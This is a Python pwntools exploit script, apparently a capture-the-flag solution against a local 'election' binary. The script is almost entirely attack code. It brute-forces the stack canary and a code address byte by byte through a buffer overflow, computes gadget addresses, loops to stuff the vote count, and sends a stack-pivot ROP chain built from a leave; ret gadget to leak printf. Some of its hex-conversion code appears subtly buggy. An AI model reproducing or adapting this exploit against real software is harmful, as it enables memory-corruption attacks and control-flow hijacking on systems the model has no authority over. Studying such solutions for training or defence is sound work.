from pwn import *
p = process("./election")

# code from https://tasteofsecurity.com/security/ret2libc-unknown-libc/
#end

context.arch = 'amd64'

payload = 'a' * 0xb8

p.sendlineafter('>\n', b'2')
p.sendafter(': ' , payload)
payloaden = payload.encode()
for obj in range(16):
    #log.info(obj)
    p.sendlineafter('>\n', b'1')
    for i in range(256):
        p.sendafter(': ', payloaden + bytes([i]))
        a = p.recv(7)
        a = a.decode()
        if a != 'Invalid':
            payloaden += bytes([i])
            #log.info(payload)
            #log.info(0xb8)
            #log.info(len(payload))
            p.sendlineafter('>\n', b'3')
            break
        else:
            p.sendlineafter('>\n', b'1')
            #b = p.recvuntil(': ')
            #log.info(b)
canary = (payloaden[184:192])[::-1]
libc = (payloaden[192:200])[::-1]
canary_count = ""
csu = ""
for i in canary:
    if i > 16:
        canary_count += str(hex(i))[2:]
    else:
        canary_count += '0'
        canary_count += str(hex(i))[2:]
for i in libc:
    if i > 16:
        csu += str(hex(i))[2:]
    else:
        csu += '0'



buf_offset = 0x202160
libc_offset = 0x1140
base = hex(int(csu,16) - libc_offset)
buf = hex(int(csu,16) - libc_offset + buf_offset)
POP_RDI = hex(int(csu,16) - libc_offset + 0x11a3)
LEAK_PRINTF = hex(int(csu,16) - libc_offset + 0x201fa0)
CALL_PRINTF = hex(int(csu,16) - libc_offset + 0x960)

#log.info(payloaden)
#log.info(payloaden[0xb8:])
buf_payload = b'a'*0x08
buf_payload += p64(int(POP_RDI,16))
buf_payload += p64(int(LEAK_PRINTF,16)) 
buf_payload += p64(int(CALL_PRINTF,16))
buf_payload += b'a'*(0xb8 - len(buf_payload))

log.info(len(buf_payload))
buf_payload += payloaden[0xb8:]
log.info(buf_payload)
log.info(payloaden)
payloaden = buf_payload
payload = payloaden[:0xb8]

can = hex(int(canary_count,16))
log.info("canary -> %s"%can)
log.info("base -> %s" % base)
log.info("buf -> %s" % buf)
log.info("pop rdi -> %s" % POP_RDI)
#pause()
#上面在information leak

#接著要灌票, 灌到256張
p.sendlineafter('>\n', b'2')
p.sendafter(': ', b'jizz')
p.sendlineafter('>\n', b'1')
p.sendafter(': ', b'jizz')
#p.sendafter(': ', buf_payload)

count = 0
for obj in range(29):
    if obj == 28:
        for i in range(3):
            #log.info(i)
            p.sendlineafter('>\n', b'1')
            p.sendafter('[0~9]: ', b'0')
            count += 1
    else:    
        for i in range(9):
            #log.info(i)
            p.sendlineafter('>\n', b'1')
            p.sendafter('[0~9]: ', b'0')
            count += 1
    p.sendlineafter('>\n', b'3')
    p.sendlineafter('>\n', b'2')
    p.sendafter(': ' , payload)
    p.sendlineafter('>\n', b'1')
    p.sendlineafter(': ', payloaden)

p.sendlineafter('>\n', b'2')
p.sendafter('[0~9]: ', b'0')

#log.info(p.recv(0x1000).decode())

#票數夠了之後, 就是要構造payload, 先塞0xe8, 然後canary, buf, leave ret

trash = 'a' * 0xe8
trash = trash.encode()
log.info("buf -> %s" % p64(int(buf,16)))

buf_bin = p64(int(buf,16))
can_bin = p64(int(can,16))
#log.info(trash + canary + buf_bin)

leave_ret_offset = 0xbe9
leave_ret = hex(int(csu,16) - libc_offset + leave_ret_offset)
log.info(leave_ret)
leave_bin = p64(int(leave_ret,16))

new_payload = trash + can_bin + buf_bin + leave_bin
#log.info(u64(can_bin))
log.info(new_payload)
log.info(len(new_payload))

#pause()
#p.sendafter('Message: ', trash)
#log.info(p.recvuntil('Message: ').decode())
p.sendafter('Message: ', new_payload)
log.info(p.recv(0x1000).decode())
#pause()




#log.info(p.recv(0x1000).decode())
log.info("jizz")
p.sendline('3')
#pause()
#p.sendlineafter('>\n', '3')
log.info(p.recv(0x1000).decode())
log.info(count)